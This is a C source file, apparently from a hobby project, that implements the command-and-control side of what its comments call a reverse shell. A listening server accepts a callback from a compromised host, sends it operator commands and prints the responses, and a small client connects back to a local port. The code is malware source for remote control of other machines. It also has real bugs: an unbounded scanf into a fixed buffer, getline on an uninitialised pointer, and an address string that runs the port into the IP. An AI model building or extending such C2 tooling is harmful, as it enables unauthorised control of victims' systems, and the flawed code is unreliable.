#include <stdio.h>
#include <sys/socket.h> //unix-specific...
#include <netdb.h> //for little to big endian
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h> //for inet_pton()
#include <unistd.h>

#include "socket.h"
#include "commands.h"
#include "definitions.h"
#include "externs.h"

//TODO - get windows sockets working :(

/* As this application is a reverse shell style program, the server is the 
* command and control machine that gets connected back to.
*/
int start_server(void)
{
	int socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_descriptor == -1)
		fprintf(stderr, "%s\n", "Failed to create socket.");

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = INADDR_ANY,
		.sin_port = htons(GlobalConfig.server_port)
	};

	if (bind(socket_descriptor, (struct sockaddr *) &address, sizeof(address)) < 0) {
		fprintf(stderr, "%s %d\n", "Failed to bind to port: ", GlobalConfig.server_port);
	}
	if (listen(socket_descriptor, 10)) {
		fprintf(stderr, "%s\n", "Listening failed / over 10 waiting connections.");
	}
	
	return server_handle_conn(socket_descriptor);
}


/* Responsible for accepting the socket descriptor, handling it, and closing it. */
int server_handle_conn(int socket_fd)
{
	#define SERVER_BUFLEN 1024
	char buf[SERVER_BUFLEN];
	struct sockaddr_storage c_addr;
	socklen_t c_addr_len = sizeof(c_addr);
	char quit = 0; //bool flag for the do-while loop
	
	int cfd = accept(socket_fd, (struct sockaddr *) &c_addr, &c_addr_len);
	if (cfd == -1) {
		fprintf(stderr, "%s\n", "failed to accept the reverse binding");
		return -1;
	}	

	if (recv(cfd, buf, sizeof(buf) - 1, 0) > 0) {
		buf[SERVER_BUFLEN - 1] = '\n';
		printf("Contact received: %s\n", buf);
	}
	do {
		quit = server_loop(cfd, buf, sizeof(buf));
	} while (!quit);

	close(cfd);
	close(socket_fd);
	return 0;
}

/* server_loop() is to be run from the C&C machine 
* host_conn: socket connection to the host machine
* buf is local to server_handle_conn, but its stack frame outlives server_loop
* buflen is the length of buf
* should not close host_conn */ 
int server_loop(int host_conn, char *buf, size_t buflen)
{
	int command[1]; //hack...
	
	printf("%s\n", "Enter command to send: ");
	scanf("%s", buf); //assume non-malicious input from own C&C operator...
	buf[buflen - 1] = '\0';
	command[0] = parse_command(buf); //not a stack escape, because this frame continues
	if (command[0] == CMD_QUIT)
		return -1;
	int send_status = send(host_conn, command, sizeof(int), 0);
	if (send_status < 0)
		printf("%s\n", "Failed to send command over socket.");
	else {
		memset(buf, 0, buflen);
		int response = recv(host_conn, buf, buflen - 1, 0);
		if (response > 0) {
			buf[buflen - 1] = '\0';
			printf("Return response: %s\n", buf);
		}
	}
	return 0;
}

int startClient(void)
{
	int CONNECTION_PORT = 2001;	
	struct sockaddr_in s = { 0 };
	char addrstr[NI_MAXHOST + NI_MAXSERV + 1];
	int c_fd = socket(AF_INET, SOCK_STREAM, 0);
	s.sin_family = AF_INET;
	s.sin_port = htons(CONNECTION_PORT);


	snprintf(addrstr, sizeof(addrstr), "127.0.0.1%d", CONNECTION_PORT);
	inet_pton(AF_INET, addrstr, &s.sin_addr);

	if (connect(c_fd, (struct sockaddr *) &s, sizeof(s))) {
		fprintf(stderr, "Failed to connect%s", "\n");
	}

	char *msg;
	size_t len = 0;
	printf("%s\n", "Enter message to send to server: ");
	getline(&msg, &len, stdin);

	if (send(c_fd, msg, strlen(msg) + 1, 0) < 0) {
		fprintf(stderr, "%s\n", "failed to send");
	}

	close(c_fd);
	free(msg);
	return 0;
}
